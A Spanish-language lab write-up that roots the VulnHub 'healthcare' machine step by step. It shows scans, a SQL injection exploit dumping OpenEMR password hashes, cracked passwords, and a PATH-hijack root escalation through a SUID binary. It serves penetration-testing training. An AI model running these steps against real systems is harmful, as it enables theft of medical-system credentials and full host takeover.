+++
title = "healthcare - Vulnhub"
+++

[link => healthcare](https://www.vulnhub.com/entry/healthcare-1,522/)

---

## Escaneo de red con nmap para descubrir máquina objetivo

```bash
nmap -sn 10.38.1.0/24
```

![nmaphd](/images/writeups/vulnhub/healthcare/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.14**

## Escaneo de la máquina objetivo en busca de puertos abiertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.14 -oN target_scan.nmap
```

```bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: target_scan.nmap
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Sun Oct 20 20:20:18 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n
       │  -Pn -oN target_scan.nmap 10.38.1.14
   2   │ Nmap scan report for 10.38.1.14
   3   │ Host is up, received arp-response (0.00011s latency).
   4   │ Scanned at 2024-10-20 20:20:18 EDT for 2s
   5   │ Not shown: 65533 closed tcp ports (reset)
   6   │ PORT   STATE SERVICE REASON
   7   │ 21/tcp open  ftp     syn-ack ttl 64
   8   │ 80/tcp open  http    syn-ack ttl 64
   9   │ MAC Address: 08:00:27:F2:B4:0B (Oracle VirtualBox virtual NIC)
  10   │ 
  11   │ Read data files from: /usr/bin/../share/nmap
  12   │ # Nmap done at Sun Oct 20 20:20:20 2024 -- 1 IP address (1 host up) scanned in 2.25 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
```


### **Puertos Abiertos: 21,80**

## Ejecución de scripts con nmap

```bash
sudo nmap -sCV -p21,80 10.38.1.14 -oN scripts_exec.nmap
```

```bash
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: scripts_exec.nmap
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Sun Oct 20 20:21:48 2024 as: nmap -sCV -p21,80 -oN scripts_exec.nmap 10.
       │ 38.1.14
   2   │ Nmap scan report for 10.38.1.14
   3   │ Host is up (0.00043s latency).
   4   │ 
   5   │ PORT   STATE SERVICE VERSION
   6   │ 21/tcp open  ftp     ProFTPD 1.3.3d
   7   │ 80/tcp open  http    Apache httpd 2.2.17 ((PCLinuxOS 2011/PREFORK-1pclos2011))
   8   │ |_http-title: Coming Soon 2
   9   │ | http-robots.txt: 8 disallowed entries 
  10   │ | /manual/ /manual-2.2/ /addon-modules/ /doc/ /images/ 
  11   │ |_/all_our_e-mail_addresses /admin/ /
  12   │ |_http-server-header: Apache/2.2.17 (PCLinuxOS 2011/PREFORK-1pclos2011)
  13   │ MAC Address: 08:00:27:F2:B4:0B (Oracle VirtualBox virtual NIC)
  14   │ Service Info: OS: Unix
  15   │ 
  16   │ Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  17   │ # Nmap done at Sun Oct 20 20:22:08 2024 -- 1 IP address (1 host up) scanned in 20.44 seconds
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Enumeración de directorios con gobuster

```bash
gobuster dir -u http://10.38.1.14/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.html,.js,.txt,.zip 
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.38.1.14/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt,zip,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 336] [--> http://10.38.1.14/images/]
/index                (Status: 200) [Size: 5031]
/index.html           (Status: 200) [Size: 5031]
/.html                (Status: 403) [Size: 996]
/css                  (Status: 301) [Size: 333] [--> http://10.38.1.14/css/]
/js                   (Status: 301) [Size: 332] [--> http://10.38.1.14/js/]
/vendor               (Status: 301) [Size: 336] [--> http://10.38.1.14/vendor/]
/favicon              (Status: 200) [Size: 1406]
/robots               (Status: 200) [Size: 620]
/robots.txt           (Status: 200) [Size: 620]
/fonts                (Status: 301) [Size: 335] [--> http://10.38.1.14/fonts/]
/gitweb               (Status: 301) [Size: 336] [--> http://10.38.1.14/gitweb/]
/.html                (Status: 403) [Size: 996]
/phpMyAdmin           (Status: 403) [Size: 59]
/server-status        (Status: 403) [Size: 996]
/server-info          (Status: 403) [Size: 996]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 996]
/openemr              (Status: 301) [Size: 337] [--> http://10.38.1.14/openemr/]
Progress: 7642992 / 7642998 (100.00%)
===============================================================
Finished
===============================================================
```

## Búsqueda de exploit con searchsploit

![nmaphd](/images/writeups/vulnhub/healthcare/nmaphd.png)

```bash
searchsploit OpenEMR
```

```bash
------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                |  Path
------------------------------------------------------------------------------ ---------------------------------
OpenEMR - 'site' Cross-Site Scripting                                         | php/webapps/38328.txt
OpenEMR - Arbitrary '.PHP' File Upload (Metasploit)                           | php/remote/24529.rb
OpenEMR 2.8.1 - 'fileroot' Remote File Inclusion                              | php/webapps/1886.txt
OpenEMR 2.8.1 - 'srcdir' Multiple Remote File Inclusions                      | php/webapps/2727.txt
OpenEMR 2.8.2 - 'Import_XML.php' Remote File Inclusion                        | php/webapps/29556.txt
OpenEMR 2.8.2 - 'Login_Frame.php' Cross-Site Scripting                        | php/webapps/29557.txt
OpenEMR 3.2.0 - SQL Injection / Cross-Site Scripting                          | php/webapps/15836.txt
OpenEMR 4 - Multiple Vulnerabilities                                          | php/webapps/18274.txt
OpenEMR 4.0 - Multiple Cross-Site Scripting Vulnerabilities                   | php/webapps/36034.txt
OpenEMR 4.0.0 - Multiple Vulnerabilities                                      | php/webapps/17118.txt
OpenEMR 4.1 - '/contrib/acog/print_form.php?formname' Traversal Local File In | php/webapps/36650.txt
OpenEMR 4.1 - '/Interface/fax/fax_dispatch.php?File' 'exec()' Call Arbitrary  | php/webapps/36651.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/load_form.php?formname' Trav | php/webapps/36649.txt
OpenEMR 4.1 - '/Interface/patient_file/encounter/trend_form.php?formname' Tra | php/webapps/36648.txt
OpenEMR 4.1 - 'note' HTML Injection                                           | php/webapps/38654.txt
OpenEMR 4.1.0 - 'u' SQL Injection                                             | php/webapps/49742.py
OpenEMR 4.1.1 - 'ofc_upload_image.php' Arbitrary File Upload                  | php/webapps/24492.php
OpenEMR 4.1.1 Patch 14 - Multiple Vulnerabilities                             | php/webapps/28329.txt
OpenEMR 4.1.1 Patch 14 - SQL Injection / Privilege Escalation / Remote Code E | php/remote/28408.rb
OpenEMR 4.1.2(7) - Multiple SQL Injections                                    | php/webapps/35518.txt
OpenEMR 5.0.0 - OS Command Injection / Cross-Site Scripting                   | php/webapps/43232.txt
OpenEMR 5.0.0 - Remote Code Execution (Authenticated)                         | php/webapps/49983.py
OpenEMR 5.0.1 - 'controller' Remote Code Execution                            | php/webapps/48623.txt
OpenEMR 5.0.1 - Remote Code Execution (1)                                     | php/webapps/48515.py
OpenEMR 5.0.1 - Remote Code Execution (Authenticated) (2)                     | php/webapps/49486.rb
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)   | php/webapps/49998.py
OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) ( | php/webapps/50122.rb
OpenEMR 5.0.1.3 - (Authenticated) Arbitrary File Actions                      | linux/webapps/45202.txt
OpenEMR 5.0.1.3 - Authentication Bypass                                       | php/webapps/50017.py
OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)                       | php/webapps/45161.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated)                   | php/webapps/50037.py
OpenEMR 5.0.1.7 - 'fileName' Path Traversal (Authenticated) (2)               | php/webapps/50087.rb
OpenEMR 5.0.2.1 - Remote Code Execution                                       | php/webapps/49784.py
OpenEMR 6.0.0 - 'noteid' Insecure Direct Object Reference (IDOR)              | php/webapps/50260.txt
OpenEMR Electronic Medical Record Software 3.2 - Multiple Vulnerabilities     | php/webapps/14011.txt
OpenEMR v7.0.1 - Authentication credentials brute force                       | php/webapps/51413.py
Openemr-4.1.0 - SQL Injection                                                 | php/webapps/17998.txt
------------------------------------------------------------------------------ ---------------------------------
```

```bash
-> searchsploit -m php/webapps/49742.py


Exploit: OpenEMR 4.1.0 - 'u' SQL Injection
      URL: https://www.exploit-db.com/exploits/49742
     Path: /usr/share/exploitdb/exploits/php/webapps/49742.py
    Codes: N/A
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/fafi/Documents/vulnhub/healthcare/49742.py
```

```bash
-> mv 49742.py exploit_openemr.py

-> python3 exploit_openemr.py

   ____                   ________  _______     __ __   ___ ____
  / __ \____  ___  ____  / ____/  |/  / __ \   / // /  <  // __ \
 / / / / __ \/ _ \/ __ \/ __/ / /|_/ / /_/ /  / // /_  / // / / /
/ /_/ / /_/ /  __/ / / / /___/ /  / / _, _/  /__  __/ / // /_/ /
\____/ .___/\___/_/ /_/_____/_/  /_/_/ |_|     /_/ (_)_(_)____/
    /_/
    ____  ___           __   _____ ____    __    _
   / __ )/ (_)___  ____/ /  / ___// __ \  / /   (_)
  / /_/ / / / __ \/ __  /   \__ \/ / / / / /   / /
 / /_/ / / / / / / /_/ /   ___/ / /_/ / / /___/ /
/_____/_/_/_/ /_/\__,_/   /____/\___\_\/_____/_/   exploit by @ikuamike

[+] Finding number of users...
[+] Found number of users: 2
[+] Extracting username and password hash...
admin:3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical:ab24aed5a7c4ad45615cd7e0da816eea39e4895d                                                    
```

## Credenciales de usuarios

```bash
-> john -w=/usr/share/wordlists/rockyou.txt adminhash

======
ackbar
====== 

-> john -w=/usr/share/wordlists/rockyou.txt medicalhash 

=======
medical
=======
```

## Reverse shell

![nmaphd](/images/writeups/vulnhub/healthcare/revshell.png)

## Escalada de privilegios

### Búsqueda de binarios SUID

```bash
bash-4.1$ find / -perm -u=s -type f 2>/dev/null
/usr/libexec/pt_chown
/usr/lib/ssh/ssh-keysign
/usr/lib/polkit-resolve-exe-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/chromium-browser/chrome-sandbox
/usr/lib/polkit-grant-helper-pam
/usr/lib/polkit-set-default-helper
/usr/sbin/fileshareset
/usr/sbin/traceroute6
/usr/sbin/usernetctl
/usr/sbin/userhelper
/usr/bin/crontab
/usr/bin/at
/usr/bin/pumount
/usr/bin/batch
/usr/bin/expiry
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/wvdial
/usr/bin/pmount
/usr/bin/sperl5.10.1
/usr/bin/gpgsm
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/passwd
/usr/bin/gpg
/usr/bin/healthcheck
/usr/bin/Xwrapper
/usr/bin/ping6
/usr/bin/chsh
/lib/dbus-1/dbus-daemon-launch-helper
/sbin/pam_timestamp_check
/bin/ping
/bin/fusermount
/bin/su
/bin/mount
/bin/umount
```

```bash
bash-4.1$ strings /usr/bin/healthcheck 
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
setuid
system
setgid
__libc_start_main
GLIBC_2.0
PTRhp
[^_]
clear ; echo 'System Health Check' ; echo '' ; echo 'Scanning System' ; sleep 2 ; ifconfig ; fdisk -l ; du -h
```

### PATH hijacking del binario fdisk

```bash
bash-4.1$ cd /tmp
bash-4.1$ pwd
/tmp

bash-4.1$ echo "chmod u+s /bin/bash" > fdisk
bash-4.1$ chmod +x fdisk

bash-4.1$ export PATH=/tmp:$PATH
bash-4.1$ /usr/bin/healthcheck


bash-4.1$ /bin/bash -p
bash-4.1# whoami
root
```

